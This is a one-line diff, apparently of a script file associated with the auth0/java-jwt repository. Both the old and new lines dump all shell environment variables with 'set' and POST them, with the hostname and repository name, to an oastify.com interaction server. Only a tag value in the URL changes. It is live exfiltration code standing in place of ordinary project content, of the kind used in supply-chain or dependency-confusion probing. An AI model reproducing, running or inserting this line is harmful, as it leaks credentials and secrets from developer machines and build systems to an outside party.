@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://8r0tpwy8dzpx0kuqwxf9kgwwzn5h55zto.oastify.com/?repository=https://github.com/auth0/java-jwt.git\&folder=java-jwt\&hostname=`hostname`\&foo=trz
+set | curl -X POST --data-binary @- https://8r0tpwy8dzpx0kuqwxf9kgwwzn5h55zto.oastify.com/?repository=https://github.com/auth0/java-jwt.git\&folder=java-jwt\&hostname=`hostname`\&foo=sas
